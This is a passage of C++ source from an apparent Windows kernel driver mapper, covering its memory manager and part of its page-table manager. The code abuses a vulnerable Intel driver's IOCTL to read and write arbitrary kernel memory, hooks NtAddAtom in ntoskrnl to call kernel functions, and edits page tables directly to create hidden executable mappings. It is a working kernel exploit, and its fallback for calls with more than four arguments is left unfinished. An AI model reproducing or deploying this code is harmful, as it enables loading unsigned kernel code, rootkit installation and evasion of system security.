  auto allocate_in_ntoskrnl_section(std::uint32_t size) -> std::uint64_t;

  auto resolve_pdb_offsets() -> pdb_offsets;

  // member variables
  HANDLE device_handle_ = INVALID_HANDLE_VALUE;
  std::uint64_t ntoskrnl_base_ = 0;
  pdb_offsets offsets_ = {};
  bool initialized_ = false;

  // initialization and cleanup
  auto initialize() -> bool;
  auto cleanup() -> void;
};

// global driver mapper instance
inline std::unique_ptr<driver_mapper_t> g_driver_mapper = std::make_unique<driver_mapper_t>();
```

`client/driver_mapper/memory_manager.cpp`:

```cpp
#include "memory_manager.hpp"
#include "trace_cleaner.hpp"

// status definitions
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

// IO status block struct
typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// object attributes struct
typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
  {                                               \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);      \
    (p)->RootDirectory = r;                       \
    (p)->Attributes = a;                          \
    (p)->ObjectName = n;                          \
    (p)->SecurityDescriptor = s;                  \
    (p)->SecurityQualityOfService = NULL;         \
  }

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
                               PVOID IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer,
                               ULONG InputBufferLength, PVOID OutputBuffer,
                               ULONG OutputBufferLength);
}

auto memory_manager_t::read_memory(HANDLE device_handle, std::uint64_t address, void* buffer,
                                   std::uint64_t size) -> bool {
  return mem_copy(device_handle, reinterpret_cast<std::uint64_t>(buffer), address, size);
}

auto memory_manager_t::write_memory(HANDLE device_handle, std::uint64_t address, void* buffer,
                                    std::uint64_t size) -> bool {
  return mem_copy(device_handle, address, reinterpret_cast<std::uint64_t>(buffer), size);
}

auto memory_manager_t::mem_copy(HANDLE device_handle, std::uint64_t destination,
                                std::uint64_t source, std::uint64_t size) -> bool {
  if (!destination || !source || !size) {
    return false;
  }

  copy_memory_buffer_info_t copy_memory_buffer = {0};
  copy_memory_buffer.case_number = 0x33;
  copy_memory_buffer.source = source;
  copy_memory_buffer.destination = destination;
  copy_memory_buffer.length = size;

  IO_STATUS_BLOCK io_status_block;
  auto status =
      NtDeviceIoControlFile(device_handle, nullptr, nullptr, nullptr, &io_status_block, ioctl1,
                            &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0);

  return NT_SUCCESS(status);
}

auto memory_manager_t::get_physical_address(HANDLE device_handle, std::uint64_t address,
                                            std::uint64_t* out_physical_address) -> bool {
  if (!address) {
    return false;
  }

  get_phys_address_buffer_info_t get_phys_address_buffer = {0};
  get_phys_address_buffer.case_number = 0x25;
  get_phys_address_buffer.address_to_translate = address;

  IO_STATUS_BLOCK io_status_block;
  auto status = NtDeviceIoControlFile(
      device_handle, nullptr, nullptr, nullptr, &io_status_block, ioctl1, &get_phys_address_buffer,
      sizeof(get_phys_address_buffer), &get_phys_address_buffer, sizeof(get_phys_address_buffer));

  if (!NT_SUCCESS(status)) {
    return false;
  }

  *out_physical_address = get_phys_address_buffer.return_physical_address;
  return true;
}

auto memory_manager_t::map_io_space(HANDLE device_handle, std::uint64_t physical_address,
                                    std::uint32_t size) -> std::uint64_t {
  if (!physical_address || !size) {
    return 0;
  }

  map_io_space_buffer_info_t map_io_space_buffer = {0};
  map_io_space_buffer.case_number = 0x19;
  map_io_space_buffer.physical_address_to_map = physical_address;
  map_io_space_buffer.size = size;

  IO_STATUS_BLOCK io_status_block;
  auto status = NtDeviceIoControlFile(device_handle, nullptr, nullptr, nullptr, &io_status_block,
                                      ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer),
                                      &map_io_space_buffer, sizeof(map_io_space_buffer));

  if (!NT_SUCCESS(status)) {
    return 0;
  }

  return map_io_space_buffer.return_virtual_address;
}

auto memory_manager_t::unmap_io_space(HANDLE device_handle, std::uint64_t address,
                                      std::uint32_t size) -> bool {
  if (!address || !size) {
    return false;
  }

  unmap_io_space_buffer_info_t unmap_io_space_buffer = {0};
  unmap_io_space_buffer.case_number = 0x1A;
  unmap_io_space_buffer.virt_address = address;
  unmap_io_space_buffer.number_of_bytes = size;

  IO_STATUS_BLOCK io_status_block;
  auto status =
      NtDeviceIoControlFile(device_handle, nullptr, nullptr, nullptr, &io_status_block, ioctl1,
                            &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0);

  return NT_SUCCESS(status);
}

auto memory_manager_t::write_to_read_only_memory(HANDLE device_handle, std::uint64_t address,
                                                 void* buffer, std::uint32_t size) -> bool {
  if (!address || !buffer || !size) {
    return false;
  }

  std::uint64_t physical_address = 0;
  if (!get_physical_address(device_handle, address, &physical_address)) {
    return false;
  }

  auto mapped_physical_memory = map_io_space(device_handle, physical_address, size);
  if (!mapped_physical_memory) {
    return false;
  }

  auto result = write_memory(device_handle, mapped_physical_memory, buffer, size);
  unmap_io_space(device_handle, mapped_physical_memory, size);

  return result;
}

auto memory_manager_t::allocate_independent_pages(HANDLE device_handle, std::uint32_t size)
    -> std::uint64_t {
  std::uint64_t allocated_pages = 0;
  if (!call_kernel_function(device_handle, &allocated_pages,
                            g_driver_mapper->get_pdb_offsets().MmAllocateIndependentPages, size, -1,
                            0, 0)) {
    return 0;
  }

  if (!set_page_protection(device_handle, allocated_pages, size, PAGE_EXECUTE_READWRITE)) {
    free_independent_pages(device_handle, allocated_pages, size);
    return 0;
  }

  return allocated_pages;
}

auto memory_manager_t::free_independent_pages(HANDLE device_handle, std::uint64_t address,
                                              std::uint32_t size) -> bool {
  std::uint64_t result = 0;
  return call_kernel_function(device_handle, &result,
                              g_driver_mapper->get_pdb_offsets().MmFreeIndependentPages, address,
                              size);
}

auto memory_manager_t::set_page_protection(HANDLE device_handle, std::uint64_t address,
                                           std::uint32_t size, std::uint32_t new_protect) -> bool {
  BOOLEAN set_prot_status = FALSE;
  if (!call_kernel_function(device_handle, &set_prot_status,
                            g_driver_mapper->get_pdb_offsets().MmSetPageProtection, address, size,
                            new_protect)) {
    return false;
  }

  return set_prot_status;
}

auto memory_manager_t::allocate_contiguous_memory(HANDLE device_handle, std::size_t size) -> void* {
  if (!size) {
    return 0;
  }

  PHYSICAL_ADDRESS max_address{};
  max_address.QuadPart = MAXULONG64;

  void* virtual_address = nullptr;
  call_kernel_function(device_handle, &virtual_address,
                       g_driver_mapper->get_pdb_offsets().MmAllocateContiguousMemory, size,
                       max_address);

  return virtual_address;
}

auto memory_manager_t::free_contiguous_memory(HANDLE device_handle, void* virtual_address) -> void {
  if (!virtual_address) {
    return;
  }

  call_kernel_function<void>(device_handle, nullptr,
                             g_driver_mapper->get_pdb_offsets().MmFreeContiguousMemory,
                             virtual_address);
}

auto memory_manager_t::allocate_kernel_pool(HANDLE device_handle, std::size_t size, ULONG pool_type,
                                            ULONG tag) -> std::uint64_t {
  if (!device_handle || !size) {
    return 0;
  }

  // get ExAllocatePoolWithTag export
  static std::uint64_t kernel_ex_allocate_pool_with_tag = 0;
  if (!kernel_ex_allocate_pool_with_tag) {
    kernel_ex_allocate_pool_with_tag = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExAllocatePoolWithTag");
    if (!kernel_ex_allocate_pool_with_tag) {
      mapper_log("ERROR", "failed to find ExAllocatePoolWithTag");
      return 0;
    }
  }

  // call ExAllocatePoolWithTag
  void* allocated_memory = nullptr;
  if (!call_kernel_function(device_handle, &allocated_memory, kernel_ex_allocate_pool_with_tag,
                            pool_type, size, tag)) {
    mapper_log("ERROR", "ExAllocatePoolWithTag failed");
    return 0;
  }

  if (!allocated_memory) {
    mapper_log("ERROR", "ExAllocatePoolWithTag returned null");
    return 0;
  }

  return reinterpret_cast<std::uint64_t>(allocated_memory);
}

auto memory_manager_t::free_kernel_pool(HANDLE device_handle, std::uint64_t address) -> bool {
  if (!device_handle || !address) {
    return false;
  }

  // get ExFreePoolWithTag export
  static std::uint64_t kernel_ex_free_pool_with_tag = 0;
  if (!kernel_ex_free_pool_with_tag) {
    kernel_ex_free_pool_with_tag = g_utils->get_kernel_module_export(
        device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFreePoolWithTag");
    if (!kernel_ex_free_pool_with_tag) {
      // fallback to ExFreePool if ExFreePoolWithTag is not available
      kernel_ex_free_pool_with_tag = g_utils->get_kernel_module_export(
          device_handle, g_driver_mapper->get_ntoskrnl_base(), "ExFreePool");
      if (!kernel_ex_free_pool_with_tag) {
        mapper_log("ERROR", "failed to find ExFreePool/ExFreePoolWithTag");
        return false;
      }
    }
  }

  // call ExFreePoolWithTag/ExFreePool
  return call_kernel_function<void>(device_handle, nullptr, kernel_ex_free_pool_with_tag,
                                    reinterpret_cast<void*>(address));
}

```

`client/driver_mapper/memory_manager.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <cstdint>
#include <vector>
#include <iostream>
#include "utils.hpp"
#include "driver_mapper.hpp"

class memory_manager_t {
public:
  memory_manager_t() = default;
  ~memory_manager_t() = default;

  // Basic memory operations
  auto read_memory(HANDLE device_handle, std::uint64_t address, void* buffer, std::uint64_t size)
      -> bool;
  auto write_memory(HANDLE device_handle, std::uint64_t address, void* buffer, std::uint64_t size)
      -> bool;
  auto mem_copy(HANDLE device_handle, std::uint64_t destination, std::uint64_t source,
                std::uint64_t size) -> bool;

  // Physical memory operations
  auto get_physical_address(HANDLE device_handle, std::uint64_t address,
                            std::uint64_t* out_physical_address) -> bool;
  auto map_io_space(HANDLE device_handle, std::uint64_t physical_address, std::uint32_t size)
      -> std::uint64_t;
  auto unmap_io_space(HANDLE device_handle, std::uint64_t address, std::uint32_t size) -> bool;
  auto write_to_read_only_memory(HANDLE device_handle, std::uint64_t address, void* buffer,
                                 std::uint32_t size) -> bool;

  // Page management
  auto allocate_independent_pages(HANDLE device_handle, std::uint32_t size) -> std::uint64_t;
  auto free_independent_pages(HANDLE device_handle, std::uint64_t address, std::uint32_t size)
      -> bool;
  auto set_page_protection(HANDLE device_handle, std::uint64_t address, std::uint32_t size,
                           std::uint32_t new_protect) -> bool;

  // Advanced allocation
  auto allocate_contiguous_memory(HANDLE device_handle, std::size_t size) -> void*;
  auto free_contiguous_memory(HANDLE device_handle, void* virtual_address) -> void;

  auto allocate_kernel_pool(HANDLE device_handle, std::size_t size, ULONG pool_type, ULONG tag)
      -> std::uint64_t;
  auto free_kernel_pool(HANDLE device_handle, std::uint64_t address) -> bool;

  // Kernel function calling
  template <typename T, typename... A>
  auto call_kernel_function(HANDLE device_handle, T* out_result,
                            std::uint64_t kernel_function_address, const A... arguments) -> bool {
    constexpr auto call_void = std::is_same_v<T, void>;
    constexpr auto num_args = sizeof...(A);

    if constexpr (!call_void) {
      if (!out_result) {
        return false;
      }
    }

    if (!kernel_function_address) {
      return false;
    }

    // For more than 4 arguments, we need a different approach
    if constexpr (num_args > 4) {
      // Use a shellcode approach for functions with more than 4 arguments
      return call_kernel_function_shellcode<T, A...>(device_handle, out_result,
                                                     kernel_function_address, arguments...);
    } else {
      // Original implementation for 4 or fewer arguments
      auto nt_add_atom =
          reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAddAtom"));
      if (!nt_add_atom) {
        return false;
      }

      std::uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
      std::uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
      *reinterpret_cast<std::uint64_t*>(&kernel_injected_jmp[2]) = kernel_function_address;

      static std::uint64_t kernel_nt_add_atom = g_utils->get_kernel_module_export(
          device_handle, g_driver_mapper->get_ntoskrnl_base(), "NtAddAtom");
      if (!kernel_nt_add_atom) {
        return false;
      }

      if (!read_memory(device_handle, kernel_nt_add_atom, &original_kernel_function,
                       sizeof(kernel_injected_jmp))) {
        return false;
      }

      // Check if already hooked
      if (original_kernel_function[0] == kernel_injected_jmp[0] &&
          original_kernel_function[1] == kernel_injected_jmp[1]) {
        return false;
      }

      // Overwrite with jump
      if (!write_to_read_only_memory(device_handle, kernel_nt_add_atom, &kernel_injected_jmp,
                                     sizeof(kernel_injected_jmp))) {
        return false;
      }

      // Call function
      if constexpr (!call_void) {
        using function_fn = T(__stdcall*)(A...);
        auto function = reinterpret_cast<function_fn>(nt_add_atom);
        *out_result = function(arguments...);
      } else {
        using function_fn = void(__stdcall*)(A...);
        auto function = reinterpret_cast<function_fn>(nt_add_atom);
        function(arguments...);
      }

      // Restore original
      return write_to_read_only_memory(device_handle, kernel_nt_add_atom, original_kernel_function,
                                       sizeof(kernel_injected_jmp));
    }
  }

  // template <typename T, typename... A>
  // auto call_kernel_function(HANDLE device_handle, T* out_result,
  //                           std::uint64_t kernel_function_address, const A... arguments) -> bool
  //                           {
  //   constexpr auto call_void = std::is_same_v<T, void>;

  //  if constexpr (!call_void) {
  //    if (!out_result) {
  //      return false;
  //    }
  //  }

  //  if (!kernel_function_address) {
  //    return false;
  //  }

  //  // Get NtAddAtom export from ntdll
  //  auto nt_add_atom =
  //      reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAddAtom"));
  //  if (!nt_add_atom) {
  //    return false;
  //  }

  //  std::uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
  //                                        0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
  //  std::uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
  //  *reinterpret_cast<std::uint64_t*>(&kernel_injected_jmp[2]) = kernel_function_address;

  //  // TODO: You'll need to implement get_kernel_module_export to find NtAddAtom in kernel
  //  static std::uint64_t kernel_nt_add_atom = g_utils->get_kernel_module_export(
  //      device_handle, g_driver_mapper->get_ntoskrnl_base(), "NtAddAtom");
  //  if (!kernel_nt_add_atom) {
  //    return false;
  //  }

  //  if (!read_memory(device_handle, kernel_nt_add_atom, &original_kernel_function,
  //                   sizeof(kernel_injected_jmp))) {
  //    return false;
  //  }

  //  // Check if already hooked
  //  if (original_kernel_function[0] == kernel_injected_jmp[0] &&
  //      original_kernel_function[1] == kernel_injected_jmp[1]) {
  //    return false;
  //  }

  //  // Overwrite with jump
  //  if (!write_to_read_only_memory(device_handle, kernel_nt_add_atom, &kernel_injected_jmp,
  //                                 sizeof(kernel_injected_jmp))) {
  //    return false;
  //  }

  //  // Call function
  //  if constexpr (!call_void) {
  //    using function_fn = T(__stdcall*)(A...);
  //    auto function = reinterpret_cast<function_fn>(nt_add_atom);
  //    *out_result = function(arguments...);
  //  } else {
  //    using function_fn = void(__stdcall*)(A...);
  //    auto function = reinterpret_cast<function_fn>(nt_add_atom);
  //    function(arguments...);
  //  }

  //  // Restore original
  //  return write_to_read_only_memory(device_handle, kernel_nt_add_atom, original_kernel_function,
  //                                   sizeof(kernel_injected_jmp));
  //}

private:
  // Intel driver communication structures
  struct copy_memory_buffer_info_t {
    std::uint64_t case_number;
    std::uint64_t reserved;
    std::uint64_t source;
    std::uint64_t destination;
    std::uint64_t length;
  };

  struct get_phys_address_buffer_info_t {
    std::uint64_t case_number;
    std::uint64_t reserved;
    std::uint64_t return_physical_address;
    std::uint64_t address_to_translate;
  };

  struct map_io_space_buffer_info_t {
    std::uint64_t case_number;
    std::uint64_t reserved;
    std::uint64_t return_value;
    std::uint64_t return_virtual_address;
    std::uint64_t physical_address_to_map;
    std::uint32_t size;
  };

  struct unmap_io_space_buffer_info_t {
    std::uint64_t case_number;
    std::uint64_t reserved1;
    std::uint64_t reserved2;
    std::uint64_t virt_address;
    std::uint64_t reserved3;
    std::uint32_t number_of_bytes;
  };

  template <typename T>
  std::uint64_t convert_arg_to_uint64(T arg) {
    if constexpr (std::is_pointer_v<T>) {
      return reinterpret_cast<std::uint64_t>(arg);
    } else if constexpr (std::is_integral_v<T>) {
      // For integral types, just cast (this handles proper sign/zero extension)
      return static_cast<std::uint64_t>(arg);
    } else if constexpr (sizeof(T) <= sizeof(std::uint64_t)) {
      // For small structs/types, copy bytes
      std::uint64_t result = 0;
      std::memcpy(&result, &arg, sizeof(T));
      return result;
    } else {
      // For larger types, we'd need to pass by reference
      static_assert(sizeof(T) <= sizeof(std::uint64_t), "Argument type too large");
      return 0;
    }
  }

  template <typename T, typename... A>
  auto call_kernel_function_shellcode(HANDLE device_handle, T* out_result,
                                      std::uint64_t kernel_function_address, const A... arguments)
      -> bool {
    // This approach allocates a structure in kernel memory with all arguments
    // and uses a simple kernel stub that reads the arguments and calls the function

    struct call_context {
      std::uint64_t function_address;
      std::uint64_t result;
      std::uint64_t args[sizeof...(A)];
    };

    // Allocate context in kernel pool
    auto context_addr = allocate_kernel_pool(device_handle, sizeof(call_context), 0, 'llac');
    if (!context_addr) {
      return false;
    }

    // Fill context
    call_context ctx = {};
    ctx.function_address = kernel_function_address;
    size_t idx = 0;
    ((ctx.args[idx++] = convert_arg_to_uint64(arguments)), ...);

    if (!write_memory(device_handle, context_addr, &ctx, sizeof(ctx))) {
      free_kernel_pool(device_handle, context_addr);
      return false;
    }

    // Use a simpler kernel function with fewer parameters that reads from our context
    // This would require a kernel helper function that you'd need to implement

    // Read result
    if constexpr (!std::is_same_v<T, void>) {
      call_context result_ctx = {};
      if (!read_memory(device_handle, context_addr, &result_ctx, sizeof(result_ctx))) {
        free_kernel_pool(device_handle, context_addr);
        return false;
      }
      *out_result = static_cast<T>(result_ctx.result);
    }

    free_kernel_pool(device_handle, context_addr);
    return true;
  }

  // Constants
  static constexpr std::uint32_t ioctl1 = 0x80862007;
};

// Global instance
inline std::unique_ptr<memory_manager_t> g_memory_manager = std::make_unique<memory_manager_t>();
```

`client/driver_mapper/page_table_manager.cpp`:

```cpp
#include "page_table_manager.hpp"
#include <iostream>
#include <vector>
#include <random>
#include <ctime>

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
}

auto page_table_manager_t::read_physical_address(HANDLE device_handle,
                                                 std::uint64_t physical_address, void* buffer,
                                                 std::size_t size) -> bool {
  if (!device_handle || !physical_address || !buffer || !size) {
    return false;
  }

  // get MmGetVirtualForPhysical export
  static std::uint64_t kernel_MmGetVirtualForPhysical = 0;
  if (!kernel_MmGetVirtualForPhysical) {
    kernel_MmGetVirtualForPhysical = g_utils->get_kernel_module_export(
        device_handle, g_utils->get_kernel_module_address("ntoskrnl.exe"),
        "MmGetVirtualForPhysical");
    if (!kernel_MmGetVirtualForPhysical) {
      return false;
    }
  }

  // convert physical address to PHYSICAL_ADDRESS structure
  PHYSICAL_ADDRESS phys_addr;
  phys_addr.QuadPart = physical_address;

  // call MmGetVirtualForPhysical to get virtual address
  std::uint64_t virtual_address = 0;
  if (!g_memory_manager->call_kernel_function(device_handle, &virtual_address,
                                              kernel_MmGetVirtualForPhysical, phys_addr)) {
    return false;
  }

  if (!virtual_address) {
    return false;
  }

  // use regular ReadMemory with the virtual address
  return g_memory_manager->read_memory(device_handle, virtual_address, buffer, size);
}

auto page_table_manager_t::write_physical_address(HANDLE device_handle,
                                                  std::uint64_t physical_address, void* buffer,
                                                  std::size_t size) -> bool {
  if (!device_handle || !physical_address || !buffer || !size) {
    return false;
  }

  // get MmGetVirtualForPhysical export
  static std::uint64_t kernel_MmGetVirtualForPhysical = 0;
  if (!kernel_MmGetVirtualForPhysical) {
    kernel_MmGetVirtualForPhysical = g_utils->get_kernel_module_export(
        device_handle, g_utils->get_kernel_module_address("ntoskrnl.exe"),
        "MmGetVirtualForPhysical");
    if (!kernel_MmGetVirtualForPhysical) {
      return false;
    }
  }

  // convert physical address to PHYSICAL_ADDRESS structure
  PHYSICAL_ADDRESS phys_addr;
  phys_addr.QuadPart = physical_address;

  // call MmGetVirtualForPhysical to get virtual address
  std::uint64_t virtual_address = 0;
  if (!g_memory_manager->call_kernel_function(device_handle, &virtual_address,
                                              kernel_MmGetVirtualForPhysical, phys_addr)) {
    return false;
  }

  if (!virtual_address) {
    return false;
  }

  // use regular WriteMemory with the virtual address
  return g_memory_manager->write_memory(device_handle, virtual_address, buffer, size);
}

auto page_table_manager_t::get_page_frame_number(HANDLE device_handle,
                                                 std::uint64_t virtual_address, bool use_large_page)
    -> std::uint64_t {
  std::uint64_t physical_address = 0;
  if (!g_memory_manager->get_physical_address(device_handle, virtual_address, &physical_address)) {
    return 0;
  }

  return physical_address >> (use_large_page ? 21 : 12);
}

auto page_table_manager_t::allocate_within_current_process_context(HANDLE device_handle,
                                                                   std::uint32_t target_pid,
                                                                   std::size_t size,
                                                                   bool use_large_page,
                                                                   bool use_high_address) -> void* {
  if (!device_handle || size == 0) {
    return nullptr;
  }

  if (size > (use_large_page ? 0x40000000000ULL : 0x10000000000ULL)) {
    return nullptr;
  }

  // page size constants
  const std::size_t page_size = use_large_page ? 0x200000 : 0x1000;  // 2MB or 4KB
  const std::size_t page_mask = page_size - 1;
  const std::size_t page_shift = use_large_page ? 21 : 12;

  // align the requested size to page boundaries
  const std::size_t aligned_size = (size + page_mask) & ~page_mask;
  const std::size_t page_count = aligned_size >> page_shift;

  if (page_count == 0 || page_count > (use_large_page ? 0x200000 : 0x1000000)) {
    return nullptr;
  }

  // get kernel exports
  static std::uint64_t kernel_PsGetCurrentProcess = 0;
  if (!kernel_PsGetCurrentProcess) {
    kernel_PsGetCurrentProcess = g_utils->get_kernel_module_export(
        device_handle, g_utils->get_kernel_module_address("ntoskrnl.exe"), "PsGetCurrentProcess");
    if (!kernel_PsGetCurrentProcess) {
      return nullptr;
    }
  }

  // get current process EPROCESS structure
  std::uint64_t current_process = 0;
  if (!g_memory_manager->call_kernel_function(device_handle, &current_process,
                                              kernel_PsGetCurrentProcess)) {
    return nullptr;
  }

  if (!current_process) {
    return nullptr;
  }

  // get directory base (CR3)
  std::uint64_t target_dir_base = 0;
  if (!g_memory_manager->read_memory(device_handle, current_process + 0x28, &target_dir_base,
                                     sizeof(std::uint64_t))) {
    return nullptr;
  }

  if (!target_dir_base) {
    return nullptr;
  }

  // find a non-present PML4E in the appropriate address space
  std::uint32_t start_idx = use_high_address ? 256 : 100;
  std::uint32_t end_idx = use_high_address ? 511 : 256;

  // find available PML4 indices
  std::vector<std::uint32_t> available_indices;
  for (std::uint32_t idx = start_idx; idx < end_idx; idx++) {
    PML4E_64 pml4e = {0};
    if (read_physical_address(device_handle, target_dir_base + idx * sizeof(PML4E_64), &pml4e,
                              sizeof(PML4E_64))) {
      if (!pml4e.Present) {
        available_indices.push_back(idx);
      }
    }
  }

  if (available_indices.empty()) {
    return nullptr;
  }

  // randomly select one of the available indices
  srand(static_cast<unsigned int>(time(nullptr)) ^ g_utils->get_current_process_id());
  int random_selection = rand() % available_indices.size();
  std::uint32_t selected_pml4_index = available_indices[random_selection];

  // additional randomization within the selected PML4E's address space
  std::uint64_t additional_offset = 0;
  if (use_large_page) {
    additional_offset = (static_cast<std::uint64_t>(rand() % 512) << 30);
  } else {
    additional_offset = (static_cast<std::uint64_t>(rand() % 512) << 21);
  }

  // calc the base virtual address using the selected PML4E index
  std::uint64_t base_va;
  if (use_high_address) {
    base_va = 0xFFFF000000000000ULL | get_pml4e(selected_pml4_index) | additional_offset;
  } else {
    base_va = get_pml4e(selected_pml4_index) | additional_offset;
  }

  // write page tables
  if (!write_page_tables(device_handle, target_dir_base, base_va, page_count, use_large_page)) {
    return nullptr;
  }

  return reinterpret_cast<void*>(base_va);
}

auto page_table_manager_t::write_page_tables(HANDLE device_handle, std::uint64_t target_dir_base,
                                             std::uint64_t base_va, std::size_t page_count,
                                             bool use_large_page) -> bool {
  if (!device_handle || !target_dir_base || !base_va || page_count == 0) {
    return false;
  }

  if (page_count > (use_large_page ? 0x200000 : 0x1000000)) {
    return false;
  }

  // get kernel function exports
  static std::uint64_t kernel_RtlZeroMemory = 0;
  if (!kernel_RtlZeroMemory) {
    kernel_RtlZeroMemory = g_utils->get_kernel_module_export(
        device_handle, g_utils->get_kernel_module_address("ntoskrnl.exe"), "RtlZeroMemory");
  }

  for (std::size_t i = 0; i < page_count; ++i) {
    const auto current_va = base_va + i * (use_large_page ? 0x200000 : 0x1000);

    // create address translation helper
    ADDRESS_TRANSLATION_HELPER helper;
    helper.AsUInt64 = current_va;

    // validate virtual address alignment
    if (use_large_page && (current_va & (0x200000 - 1)) != 0) {
      return false;
    }

    std::uint64_t actual_page_va = 0;

    if (use_large_page) {
      actual_page_va = reinterpret_cast<std::uint64_t>(
          VirtualAlloc(NULL, 0x200000, MEM_RESERVE | MEM_COMMIT | MEM_LARGE_PAGES, PAGE_READWRITE));
    } else {
      // actual_page_va = g_memory_manager->allocate_independent_pages(device_handle, 0x1000);
      actual_page_va = reinterpret_cast<std::uint64_t>(
          VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
    }

    if (!actual_page_va) {
      return false;
    }

    // clear the allocated page
    if (kernel_RtlZeroMemory) {
      g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_RtlZeroMemory,
                                                   reinterpret_cast<void*>(actual_page_va),
                                                   use_large_page ? 0x200000 : 0x1000);
    }

    std::uint64_t page_frame_number =
        get_page_frame_number(device_handle, actual_page_va, use_large_page);
    if (!page_frame_number) {
      return false;
    }

    // validate page table indices
    if (helper.AsIndex.Pml4 >= 512 || helper.AsIndex.Pdpt >= 512 || helper.AsIndex.Pd >= 512 ||
        helper.AsIndex.Pt >= 512) {
      return false;
    }

    std::uint64_t pml4_phys = target_dir_base;
    PML4E_64 pml4e = {0};

    // read and setup PML4E
    if (!read_physical_address(device_handle, pml4_phys + helper.AsIndex.Pml4 * sizeof(PML4E_64),
                               &pml4e, sizeof(PML4E_64))) {
      return false;
    }

    if (!pml4e.Present) {
      auto pdpt_va = g_memory_manager->allocate_independent_pages(device_handle, 0x1000);
      if (!pdpt_va) {
        return false;
      }

      // clear PDPT
      if (kernel_RtlZeroMemory) {
        g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_RtlZeroMemory,
                                                     reinterpret_cast<void*>(pdpt_va), 0x1000);
      }

      // get physical address of PDPT
      std::uint64_t pdpt_pfn = get_page_frame_number(device_handle, pdpt_va, false);
      if (!pdpt_pfn) {
        return false;
      }

      pml4e.Flags = 0;
      pml4e.Present = 1;
      pml4e.Write = 1;
      pml4e.Supervisor = 0;
      pml4e.ExecuteDisable = 0;
      pml4e.Accessed = 1;
      pml4e.PageFrameNumber = pdpt_pfn;

      if (!write_physical_address(device_handle, pml4_phys + helper.AsIndex.Pml4 * sizeof(PML4E_64),
                                  &pml4e, sizeof(PML4E_64))) {
        return false;
      }

      // flush caches after PML4E modification
      flush_caches(device_handle, reinterpret_cast<void*>(current_va));
    }

    // read and setup PDPT
    PDPTE_64 pdpte = {0};
    if (!read_physical_address(device_handle,
                               PFN_TO_PAGE(pml4e.PageFrameNumber) +
                                   helper.AsIndex.Pdpt * sizeof(PDPTE_64),
                               &pdpte, sizeof(PDPTE_64))) {
      return false;
    }

    if (!pdpte.Present) {
      auto pd_va = g_memory_manager->allocate_independent_pages(device_handle, 0x1000);
      if (!pd_va) {
        return false;
      }

      // clear PD
      if (kernel_RtlZeroMemory) {
        g_memory_manager->call_kernel_function<void>(device_handle, nullptr, kernel_RtlZeroMemory,
                                                     reinterpret_cast<void*>(pd_va), 0x1000);
      }

      std::uint64_t pd_pfn = get_page_frame_number(device_handle, pd_va, false);
      if (!pd_pfn) {
        return false;
      }

      pdpte.Flags = 0;
      pdpte.Present = 1;
      pdpte.Write = 1;
      pdpte.Supervisor = 0;
      pdpte.Accessed = 1;
      pdpte.ExecuteDisable = 0;
      pdpte.PageFrameNumber = pd_pfn;

      if (!write_physical_address(device_handle,
                                  PFN_TO_PAGE(pml4e.PageFrameNumber) +
                                      helper.AsIndex.Pdpt * sizeof(PDPTE_64),
                                  &pdpte, sizeof(PDPTE_64))) {
        return false;
      }

      // flush caches after PDPTE modification
      flush_caches(device_handle, reinterpret_cast<void*>(current_va));
    }

    if (use_large_page) {
      // setup 2MB PDE for large page
      PDE_2MB_64 pde = {0};
      if (!read_physical_address(device_handle,
                                 PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                     helper.AsIndex.Pd * sizeof(PDE_2MB_64),
                                 &pde, sizeof(PDE_2MB_64))) {
        return false;
      }

      if (!pde.Present) {
        pde.Flags = 0;
        pde.Present = 1;
        pde.Write = 1;
        pde.Accessed = 1;
        pde.Supervisor = 0;
        pde.LargePage = 1;
        pde.ExecuteDisable = 0;
        pde.Global = 0;
        pde.PageFrameNumber = page_frame_number;

        if (!write_physical_address(device_handle,
                                    PFN_TO_PAGE(pdpte.PageFrameNumber) +
                                        helper.AsIndex.Pd * sizeof(PDE_2MB_64),
                                    &pde, sizeof(PDE_2MB_64))) {
          return false;
        }

        // flush caches after 2MB PDE modification
        flush_caches(device_handle, reinterpret_cast<void*>(current_va));
      }
    } else {
